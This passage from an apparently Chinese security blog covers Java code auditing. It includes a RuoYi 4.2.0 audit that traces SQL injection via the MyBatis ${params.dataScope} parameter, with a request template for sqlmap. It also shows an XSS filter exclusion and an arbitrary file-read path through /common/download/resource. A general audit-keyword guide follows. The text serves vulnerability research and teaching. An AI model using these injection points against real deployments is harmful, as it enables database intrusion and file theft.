所以就有了这个漏洞</p><h3 id="SQL注入"><a class="header-anchor" href="#SQL注入">¶</a>SQL注入</h3><p>结合mybatis 1.3.2, 这里的关键词是<code>$&#123;</code></p><p>之前一直在java中寻找, 搜索之后发现只有在xml中才会有这个关键词, 在java文件中依然以sql语句形式出现</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectRoleList&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;SysRole&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;SysRoleResult&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;selectRoleContactVo&quot;</span>/&gt;</span></span><br><span class="line">where r.del_flag = &#x27;0&#x27;</span><br><span class="line">       <span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 数据范围过滤 --&gt;</span></span><br><span class="line">$&#123;params.dataScope&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以根据最上面的<code>&lt;mapper namespace=&quot;...&quot;&gt;</code>寻找到对应的java文件再根据这一段最上面的<code>&lt;select id=&quot;selectRoleList&quot; ...&gt;</code>得到是<code>selectRoleList</code>函数</p><p>一路从 xml-&gt;数据访问层-&gt;服务层(业务层)-&gt;控制层</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SysRoleMapper.xml -&gt; SysRoleMapper.java -&gt; SysRoleServiceImpl.java -&gt; SysRoleController.java</span><br></pre></td></tr></table></figure><p>一共两个地方在调用:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequiresPermissions(&quot;system:role:list&quot;)</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/list&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> TableDataInfo <span class="title function_">list</span><span class="params">(SysRole role)</span></span><br><span class="line">&#123;</span><br><span class="line">    startPage();</span><br><span class="line">    List&lt;SysRole&gt; list = roleService.selectRoleList(role);</span><br><span class="line">    <span class="keyword">return</span> getDataTable(list);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Log(title = &quot;角色管理&quot;, businessType = BusinessType.EXPORT)</span></span><br><span class="line"><span class="meta">@RequiresPermissions(&quot;system:role:export&quot;)</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/export&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> AjaxResult <span class="title function_">export</span><span class="params">(SysRole role)</span></span><br><span class="line">&#123;</span><br><span class="line">    List&lt;SysRole&gt; list = roleService.selectRoleList(role);</span><br><span class="line">    ExcelUtil&lt;SysRole&gt; util = <span class="keyword">new</span> <span class="title class_">ExcelUtil</span>&lt;SysRole&gt;(SysRole.class);</span><br><span class="line">    <span class="keyword">return</span> util.exportExcel(list, <span class="string">&quot;角色数据&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看列表参数类型<code>SysRole</code>, 看看最开始的dataScope如何定义</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 数据范围（1：所有数据权限；2：自定义数据权限；3：本部门数据权限；4：本部门及以下数据权限） */</span>  </span><br><span class="line"><span class="meta">@Excel(name = &quot;数据范围&quot;, readConverterExp = &quot;1=所有数据权限,2=自定义数据权限,3=本部门数据权限,4=本部门及以下数据权限&quot;)</span>  </span><br><span class="line"><span class="keyword">private</span> String dataScope;</span><br></pre></td></tr></table></figure><p>这一路无过滤无检查, 能直接控制, Controller直达利用点, 那打就行了</p><p>前端为角色管理, 但是前端抓包没有dataScope这个参数; 但是没事, 该接⼝接收的是⼀个SysRole对象, 可以接收DataScope这个参数;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">roleName=&amp;roleKey=&amp;status=0&amp;params%5BbeginTime%5D=&amp;params%5BendTime%5D=&amp;pageS ize=10&amp;pageNum=1&amp;orderByColumn=roleSort&amp;isAsc=asc&amp;params%5BdataScope%5D=*</span><br></pre></td></tr></table></figure><p>另外一个路由同样, 所以交给sqlmap吧</p><h3 id="XSS"><a class="header-anchor" href="#XSS">¶</a>XSS</h3><blockquote><p>哈哈!参考文件中没有这个, 人家是用黑盒测出来的</p></blockquote><p>先看看有没有filter, 一般的系统都会针对xss进行过滤</p><p><code>src/main/java/com/ruoyi/common/xss/XssFilter.java</code></p><p>下面是初始化代码, 初始化时获取了excludes和enabled变量</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">tempExcludes</span> <span class="operator">=</span> filterConfig.getInitParameter(<span class="string">&quot;excludes&quot;</span>); </span><br><span class="line">    <span class="type">String</span> <span class="variable">tempEnabled</span> <span class="operator">=</span> filterConfig.getInitParameter(<span class="string">&quot;enabled&quot;</span>);   </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span>  </span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) request;  </span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">resp</span> <span class="operator">=</span> (HttpServletResponse) response;  </span><br><span class="line">    <span class="keyword">if</span> (handleExcludeURL(req, resp)) <span class="comment">// excludes中的直接进if</span></span><br><span class="line">    &#123;  </span><br><span class="line">        chain.doFilter(request, response);  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">handleExcludeURL</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> request.getServletPath();  </span><br><span class="line">    <span class="keyword">for</span> (String pattern : excludes)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">p</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^&quot;</span> + pattern);  </span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">m</span> <span class="operator">=</span> p.matcher(url);  </span><br><span class="line">        <span class="keyword">if</span> (m.find()) <span class="comment">//匹配到子序列就返回true  </span></span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>这个变量的来源需要全局搜索excludes, 到达下面这个</p><p><code>src/main/java/com/ruoyi/framework/config/FilterConfig.java</code></p><p>再追踪一下</p><p><code>src/main/resources/application.yml</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 防止XSS攻击  </span><br><span class="line">xss:   </span><br><span class="line">  # 过滤开关  </span><br><span class="line">  enabled: true  </span><br><span class="line">  # 排除链接（多个用逗号分隔）  </span><br><span class="line">  excludes: /system/notice/*  </span><br><span class="line">  # 匹配链接  </span><br><span class="line">  urlPatterns: /system/*,/monitor/*,/tool/*</span><br></pre></td></tr></table></figure><p>所以排除链接为<code>/system/notice/*</code>, 在这个路径下进行xss的时候不会被过滤</p><p>结合这个去Controller寻找对应的接口即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/system/notice 公告信息处理</span><br><span class="line">/system/notice/edit</span><br><span class="line">/system/notice/add</span><br></pre></td></tr></table></figure><h3 id="任意⽂件读取"><a class="header-anchor" href="#任意⽂件读取">¶</a>任意⽂件读取</h3><p>从Controller下手</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 本地资源通用下载</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/common/download/resource&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">resourceDownload</span><span class="params">(String resource, HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 本地资源路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">localPath</span> <span class="operator">=</span> Global.getProfile();</span><br><span class="line">    <span class="comment">// 数据库资源地址</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">downloadPath</span> <span class="operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);</span><br><span class="line">    <span class="comment">// 下载名称</span></span><br><span class="line">    <span class="comment">//拿到文件名</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">downloadName</span> <span class="operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">    response.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">    response.setContentType(<span class="string">&quot;multipart/form-data&quot;</span>);</span><br><span class="line">    response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>,</span><br><span class="line">            <span class="string">&quot;attachment;fileName=&quot;</span> + FileUtils.setFileDownloadHeader(request, downloadName));</span><br><span class="line">    <span class="comment">//文件下载</span></span><br><span class="line">    FileUtils.writeBytes(downloadPath, response.getOutputStream());</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>resource是我们可以传⼊的值 在第103⾏使⽤localPath和使⽤<code>StringUtils.substringAfter()</code>拼接形成新的路径</p><p>其中<code>StringUtils.substringAfter()</code>有两个参数，⼀个resource是我们可控的 Constants.RESOURCE_PREFIX是⼀个常量/profile; 该函数⽬的是获取到/profile后⾯的字符串</p><p>例如<code>http://127.0.0.1/?resource=/profile/1.txt</code>经过<code>StringUtils.substringAfter</code>⽅法处理后真正要下载的⽂件就是1.txt, 在构造payload时，要写成/profile/xxx</p><p>查看localPath是从哪⾥获取的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * 全局配置类  </span></span><br><span class="line"><span class="comment"> *   </span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> ruoyi  </span></span><br><span class="line"><span class="comment"> */</span><span class="meta">@Component</span>  </span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;ruoyi&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Global</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getProfile</span><span class="params">()</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">return</span> profile;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@ConfigurationProperties</code>说明Global的属性值是由yml⽂件中的ruoyi来提供的</p><p>来到<code>src/main/resources/application.yml</code>, 所以我们可以读取该⽬录下的⽂件</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 项目相关配置  </span><br><span class="line">ruoyi:  </span><br><span class="line">  # 名称  </span><br><span class="line">  name: RuoYi  </span><br><span class="line">  # 版本  </span><br><span class="line">  version: 4.2.0  </span><br><span class="line">  # 版权年份  </span><br><span class="line">  copyrightYear: 2019  </span><br><span class="line">  # 实例演示开关  </span><br><span class="line">  demoEnabled: true  </span><br><span class="line">  # 文件路径 示例（ Windows配置D:/ruoyi/uploadPath，Linux配置 /home/ruoyi/uploadPath）  </span><br><span class="line">  profile: D:/ruoyi/uploadPath  </span><br><span class="line">  # 获取ip地址开关  </span><br><span class="line">  addressEnabled: true</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java审计指南</title>
      <link href="/article/java-Guide/"/>
      <url>/article/java-Guide/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>参考文章:</p><ol><li><a href="https://www.cnblogs.com/mjs154/p/11667796.html">springmvc Controller接收前端参数的几种方式总结</a></li></ol><h1>审计</h1><h2 id="准备工作"><a class="header-anchor" href="#准备工作">¶</a>准备工作</h2><p>在审计之前，按照如下步骤，了解框架、技术架构和业务逻辑</p><ol><li>了解应用系统主要业务逻辑，</li><li>了解项目的结构和项目当中的类依赖。</li><li>根据业务模块去读对应的代码，从功能去关联业务代码往往比逮着段代码就看效率高很多。</li></ol><h2 id="全文通读"><a class="header-anchor" href="#全文通读">¶</a>全文通读</h2><p>初步分析其系统存在的安全控制措施，如框架安全机制、安全组件、过滤器、拦截器等</p><p>从系统的入口开始审计，梳理清楚数据流及控制流走向，列出分析表</p><h2 id="敏感函数"><a class="header-anchor" href="#敏感函数">¶</a>敏感函数</h2><p>通过搜索敏感函数关键字，分析其是否存在安全缺陷，逆向追踪参数的传递过程，分析参数是否用户可控</p><h1>全文审计</h1><p>函数集文件：通常文件名中包含function或者common等关键词，这些文件里面是一些公共函数，提供给其他文件统一调用，想要寻找这些文件可以在index.php或者一些功能性文件，一般都能找到。</p><p>配置文件：通常命名中包含config关键词，配置文件中可以了解CMS使用时必要的功能性配置选项以及数据库等配置信息，另外在观看配置文件时可以注意观察配置文件中参数值是否采用双引号，如果采用双引号，可能会存在代码执行漏洞。</p><p>安全过滤文件：安全过滤文件对于做审计非常重要，关系到我们挖掘到漏洞点的利用，通常文件名中包含filter、safe、check等关键词，这类文件主要是对参数进行过滤，如 sql、xss、rce等。</p><h1>根据功能点定向审计</h1><p>文件上传: 对文件类型没有做严格过滤,或对文件名没有进行过滤造成sql注入</p><p>文件管理系统: 文件名或文件路径直接在参数中传递, 可能导致任意文件操作</p><p>登录认证功能: 未加盐/算法可逆,可能导致知道用户部分信息就可以登入他人账户</p><p>找回密码: 找回管理员密码</p><p>验证码爆破</p><h1>通用漏洞审计</h1><table><thead><tr><th>漏洞名称</th><th>关键词</th></tr></thead><tbody><tr><td>密码硬编码、密码明文存储</td><td><code>password</code>、<code>pass</code>、<code>jdbc</code></td></tr><tr><td>XSS</td><td><code>getParamter</code>、<code>&lt;%= =%&gt;</code>、<code>param</code></td></tr><tr><td>SQL 注入</td><td><code>Select</code>、<code>Dao</code>、<code>from</code>、<code>delete</code>、<code>update</code>、<code>insert</code></td></tr><tr><td>任意文件下载</td><td><code>download</code> 、<code>fileName</code> 、<code>filePath</code>、<code>write</code>、<code>getFile</code>、<code>getWriter</code></td></tr><tr><td>任意文件删除</td><td><code>Delete</code>、<code>deleteFile</code>、<code>fileName</code> 、<code>filePath</code></td></tr><tr><td>文件上传</td><td><code>Upload</code>、<code>write</code>、<code>fileName</code> 、<code>filePath</code></td></tr><tr><td>命令注入</td><td><code>getRuntime</code>、<code>exec</code>、<code>cmd</code>、<code>shell</code></td></tr><tr><td>缓冲区溢出</td><td><code>strcpy</code>,<code>strcat</code>,<code>scanf</code>,<code>memcpy</code>,<code>memmove</code>,<code>memeccpy</code> <code>Get()</code>,<code>fgetc()</code>,<code>getchar</code>;<code>read</code>,<code>printf</code></td></tr><tr><td>XML注入</td><td><code>DocumentBuilder</code>、<code>XMLStreamReader</code>、<code>SAXBuilder</code>、<code>SAXParser</code> <code>SAXReader</code> 、<code>XMLReader</code> <code>SAXSource</code> 、<code>TransformerFactory</code> 、<code>SAXTransformerFactory</code> <code>SchemaFactory</code></td></tr><tr><td>反序列化漏洞</td><td><code>ObjectlnputStream.readObject</code> 、<code>ObjectlnputStream.readUnshared</code>、<code>XMLDecoder.readObject</code> <code>Yaml.load</code> 、 <code>XStream.fromXML</code> 、<code>ObjectMapper.readValue</code> 、 <code>JSON.parseObject</code></td></tr><tr><td>url跳转</td><td><code>sendRedirect</code>、<code>setHeader</code>、<code>forward</code></td></tr><tr><td>不安全组件暴露</td><td><code>activity</code>、<code>Broadcast Receiver</code>、<code>Content Provider</code>、<code>Service</code>、 <code>inter-filter</code></td></tr><tr><td>日志记录敏感信息</td><td><code>log</code> <code>log.info</code> <code>logger.info</code></td></tr><tr><td>代码执行</td><td><code>eval</code>、<code>system</code>、<code>exec</code></td></tr></tbody></table><h1>基于关键词审计的漏洞</h1><h2 id="密码硬编码"><a class="header-anchor" href="#密码硬编码">¶</a>密码硬编码</h2><p>直接搜就完了</p><h2 id="XSS"><a class="header-anchor" href="#XSS">¶</a>XSS</h2><h3 id="反射型XSS"><a class="header-anchor" href="#反射型XSS">¶</a>反射型XSS</h3><p>反射型 XSS 一般 fortify 一般都能扫描出来如果是手工找，可全局搜索以下关键词</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getParamter</span><br><span class="line">&lt;%= 或 =%&gt;</span><br><span class="line">param</span><br><span class="line">$&#123;</span><br></pre></td></tr></table></figure><p>Servlet:request.getParameter(“name”)</p><p>Struts2:通过Action类绑定参数或model自动获取前端的参数通过action属性接收参数</p><p>SpringMVC:对象方式(类似Struts2)自定义参数名使用requestbody绑定注解获取参数request获取参数值</p><p>特点:前端-&gt;后端无过滤后端-&gt;前端无过滤</p><h3 id="存储型XSS"><a class="header-anchor" href="#存储型XSS">¶</a>存储型XSS</h3><p>两种方式:</p><p>第一种:关键词: <code>insert</code>,<code>save</code>,<code>update</code>然后找到该插入语句所属的方法名如(<code>insertUser()</code>)，然后全局搜索该方法在哪里被调用，一层层的跟踪。直到<code>getParamter()</code>方法获取请求参数的地方停止</p><p>第二种:从<code>getParamter</code>关键词开始 ，跟踪请求参数，直到插入数据库的语句，如果中间没有过 滤参数，则存在存储型 XSS</p><h2 id="SQL注入"><a class="header-anchor" href="#SQL注入">¶</a>SQL注入</h2><p>fortify 一般都能扫描出来</p><h3 id="特征"><a class="header-anchor" href="#特征">¶</a>特征</h3><p>原生jdbc使用statement对象进行数据库操作，未使用prepareStatement预编译</p><p>Mybatis：使用<code>$&#123;&#125;</code>拼接用户输入</p><p>SQL注入常见关键字：<code>Statement</code>、<code>createStatement</code>、<code>executeQuery</code>、<code>executeUpdate</code>、<code>execute</code>、<code>prepareStatement</code>、<code>$&#123;</code><code>select</code>,<code>update</code>,<code>$(</code>,<code>#</code>,<code>+append</code>等等还有什么 <code>+table</code>,<code>+id+</code>等等,那些自己整吧</p><p>当找到某个变量关键词有 SQL 注入漏洞时，还可以直接全局搜索那个关键词找出类似漏洞 的文件要查找那个页面调用到含有漏洞的代码，就要跟踪方法的调用栈</p><h3 id="步骤"><a class="header-anchor" href="#步骤">¶</a>步骤</h3><p>原生jdbc：1. 搜索<code>Statement</code>、<code>createStatement</code>、<code>executeQuery</code>、<code>executeUpdate</code>、<code>execute</code>等关键字，确定使用Statement对象执行SQL语句的代码。2. 检查<code>executeQuery</code>、<code>executeUpdate</code>、<code>execute</code>函数的参数是否经过充分过滤，是否对危险字符进行转译。3. 若使用了<code>Statement</code>对象执行SQL语句，且<code>executeQuery</code>、<code>executeUpdate</code>、<code>execute</code>函数过滤不严格，则存在SQL注入4. 搜索关键字<code>prepareStatement</code>、<code>executeQuery</code>、<code>executeUpdate</code>、<code>execute</code>确定使用预编译对象<code>prepareStatement</code>执行SQL语句的代码。5. 检查在构造SQL语句时，拼接用户输入的位置是否使用“?”占位。</p><p>Mybatis：1. 在mapper文件中搜索 <code>$&#123;</code> ，检查是否使用 <code>$&#123;&#125;</code> 拼接用户输入2. 对于无法使用<code>#&#123;&#125;</code> 拼接用户输入的位置，寻找调用该SQL语句前是否对<code>$&#123;&#125;</code>内的参数进行过滤或转译。3. 若全部使用<code>#&#123;&#125;</code>拼接用户输入，则不存在生SQL注入；若使用<code>$&#123;&#125;</code>的位置进行严格过滤或转译，则不存在SQL注入。</p><p>SQL注入高发位置：由于SQL语句中部分位置不支持预编译，或使用预编译时将改变SQL原有语法，这些位置将成为SQL注入高发点，如order by 、like 等位置后的参数，应着重进行审计</p><h2 id="任意文件下载"><a class="header-anchor" href="#任意文件下载">¶</a>任意文件下载</h2><h3 id="特征-v2"><a class="header-anchor" href="#特征-v2">¶</a>特征</h3><p>审计方法：全局搜索以下关键词<code>fileName</code><code>filePath</code><code>getFile</code><code>getWriter</code></p><h2 id="任意文件删除"><a class="header-anchor" href="#任意文件删除">¶</a>任意文件删除</h2><h3 id="特征-v3"><a class="header-anchor" href="#特征-v3">¶</a>特征</h3><p><code>delete</code>, <code>deleteFile</code>,<code>fileName</code> ,<code>filePath</code></p><h2 id="XPath注入"><a class="header-anchor" href="#XPath注入">¶</a>XPath注入</h2><h3 id="特征-v4"><a class="header-anchor" href="#特征-v4">¶</a>特征</h3><p>Xpath注入关键字：<code>DocumentBuilder</code>、<code>XPathFactory</code>、<code>XPath</code>、<code>XPathExpression</code>、<code>evaluate</code>等</p><h3 id="审计"><a class="header-anchor" href="#审计">¶</a>审计</h3><ol><li>搜索<code>DocumentBuilder</code>、<code>XPathFactory</code>、<code>XPath</code>、<code>XPathExpression</code>等关键字，定位使用Xpath相关代码位置；</li><li>检查使用<code>XPath.compile()</code>函数生成<code>XPathExpression</code>时，<code>compile</code>函数的参数是否对用户输入进行拼接；</li><li>若<code>XPath.compile()</code>函数的参数直接拼接用户输入，或者对用户输入过滤不严格，则存在XPath注入</li></ol><h2 id="XML注入"><a class="header-anchor" href="#XML注入">¶</a>XML注入</h2><h3 id="特征-v5"><a class="header-anchor" href="#特征-v5">¶</a>特征</h3><p>Java可用的xml解析器很多，比如<code>XMLReaderFactory</code>、<code>XMLReader</code>、<code>DocumentBuilderFactory</code>、<code>SAXReader</code>、<code>SAXParserFactory</code>等等</p><p>XML实体注入关键字：<code>XMLReaderFactory</code>、<code>XMLReader</code>、<code>DocumentBuilder</code>、<code>SAXBuilder</code>、<code>SAXParserFactory</code>、<code>parse</code>、<code>setFeature</code>,<code>XMLStreamReader</code>,<code>SAXParser</code>,<code>SAXSource</code>.<code>TransformerFactory</code>.<code>SAXTransformerFactory</code>, <code>SchemaFactory</code><code>validate</code></p><h3 id="审计-v2"><a class="header-anchor" href="#审计-v2">¶</a>审计</h3><ol><li>搜索XML实体注入关键字（如XMLReader、SAXReader），定位解析xml的代码块；</li><li>检查是否正确设置解析器特性；</li><li>若xml解析器没有正确设置解析特性，则存在XML实体注入；</li></ol><p>补充：推荐特性设置：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">xmlReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);    <span class="comment">// 禁用DTD</span></span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>); <span class="comment">// 防止外部普通实体</span></span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>); <span class="comment">// 防止外部参数实体</span></span><br></pre></td></tr></table></figure><h2 id="命令注入"><a class="header-anchor" href="#命令注入">¶</a>命令注入</h2><h3 id="特征-v6"><a class="header-anchor" href="#特征-v6">¶</a>特征</h3><p><code>Runtime.exec()</code>函数或<code>processBuilder</code>在构造系统命令时拼接用户输入。命令注入关键字：<code>Runtime</code>、<code>exec</code>、<code>processBuilder</code>,<code>cmd</code>,<code>shell</code></p><h3 id="审计-v3"><a class="header-anchor" href="#审计-v3">¶</a>审计</h3><ol><li>搜索关键字<code>Runtime.getRuntime()</code>，<code>processBuilder</code>等关键字定位执行系统命令的代码块；</li><li>检查<code>exec()</code>函数的参数是否拼接了用户输入，或在整个数据流中是否对用户输入进行过滤或转译；</li><li>检查<code>proceesBuilder.command()</code>函数的参数是否拼接了用户输入，或在整个数据流中是否对用户输入进行过滤或转译；</li><li>若<code>exec()</code>函数或<code>command()</code>函数拼接用户参数且过滤不充分，则存在命令注入</li></ol><p>定位危险入口点，识别所有可能执行系统命令的代码位置</p><p><code>Runtime.getRuntime().exec()</code><code>ProcessBuilder.start()</code>反射调用<code>ProcessImpl</code>、<code>UNIXProcess</code>等底层类的方法</p><p>审计技巧：使用IDE全局搜索关键词：<code>exec(</code>、<code>ProcessBuilder</code>、<code>start(</code>、<code>getRuntime()</code>。检查反射调用：搜索<code>Class.forName()</code>、<code>Method.invoke()</code>等代码块，确认是否操作危险类（如<code>ProcessImpl</code>）。</p><h2 id="日志记录敏感信息"><a class="header-anchor" href="#日志记录敏感信息">¶</a>日志记录敏感信息</h2><h3 id="特征-v7"><a class="header-anchor" href="#特征-v7">¶</a>特征</h3><p>通过搜索关键词 <code>log.info</code> <code>logger.info</code> 来进行定位</p><h2 id="CRLF注入"><a class="header-anchor" href="#CRLF注入">¶</a>CRLF注入</h2><h3 id="描述"><a class="header-anchor" href="#描述">¶</a>描述</h3><p>CRLF是“回车+换行”（\r\n）的简称。</p><p>在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码</p><p>所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。</p><h3 id="特征-v8"><a class="header-anchor" href="#特征-v8">¶</a>特征</h3><p>CRLF漏洞本身没有特殊的关键字，CRLF注入大量出现在重定向功能中，也可以通过搜索<code>Redirect</code>、<code>setHeader</code>、<code>addCookie</code>关键字来定位部分CRLF漏洞</p><p>CRLF特殊字符：<code>\r</code> 、<code>\n</code>、<code>%0a</code>、<code>%0d</code></p><h3 id="审计-v4"><a class="header-anchor" href="#审计-v4">¶</a>审计</h3><ol><li>搜索关键字<code>Redirect</code>、<code>setHeader</code>，定位操作http头部的代码, 关注<code>HttpServletResponse</code>对象</li><li>检查<code>sendRedirect</code>函数、<code>setHeader</code>函数的参数中是否拼接了用户输入，或是否对用户输入的回车换行符进行转译过滤；</li><li>若上述函数拼接用户输入，且过滤不充分，则存在CRLF注入漏洞</li></ol><h2 id="不安全的重定向和任意页面跳转"><a class="header-anchor" href="#不安全的重定向和任意页面跳转">¶</a>不安全的重定向和任意页面跳转</h2><p>开放重定向漏洞的本质是未对即将跳转的URL进行合法性校验，Javaweb中通常使用sendRedirect函数来进行重定向</p><h3 id="特征-v9"><a class="header-anchor" href="#特征-v9">¶</a>特征</h3><p><code>sendRedirect</code>、<code>redirect</code>、<code>setHeader</code>, <code>forward</code></p><p>需注意有没有配置 url 跳转白名单</p><h3 id="审计-v5"><a class="header-anchor" href="#审计-v5">¶</a>审计</h3><ol><li>搜索<code>sendRedirect</code>、<code>redirect</code>、<code>setHeader</code>等关键字，定位实现重定向功能的代码块</li><li>检查代码中是否对即将跳转的URL地址合法性进行限制；</li><li>检查URL合法性校验中，是否使用<code>startsWith</code>、<code>indexOf</code>等部分匹配校验；</li><li>检查URL合法性校验中，是否过滤了JavaScript伪协议；</li><li>若代码没有对URL合法性进行校验，则存在开放重定向漏洞，若URL合法性校验时使用部分匹配，则校验容易绕过，若没有过滤JavaScript伪协议，则存在XSS漏洞；</li></ol><h2 id="敏感信息泄露"><a class="header-anchor" href="#敏感信息泄露">¶</a>敏感信息泄露</h2><h3 id="特征-v10"><a class="header-anchor" href="#特征-v10">¶</a>特征</h3><p>查看配置文件是否配置统一错误页面，如果有则不存在此漏洞</p><p><code>Getmessage</code>、<code>exception</code></p><h2 id="路径穿越"><a class="header-anchor" href="#路径穿越">¶</a>路径穿越</h2><h3 id="特征-v11"><a class="header-anchor" href="#特征-v11">¶</a>特征</h3><p><code>File</code>、<code>getPath</code>、<code>getAbsolutePath</code>、<code>getCanonicalPath</code>、<code>entry.getName</code>、<code>multipartFile.getOriginalFilename</code></p><p>路径穿越特殊符号：</p><p><code>~</code>、<code>.</code>、<code>..</code>、<code>/</code></p><h3 id="审计-v6"><a class="header-anchor" 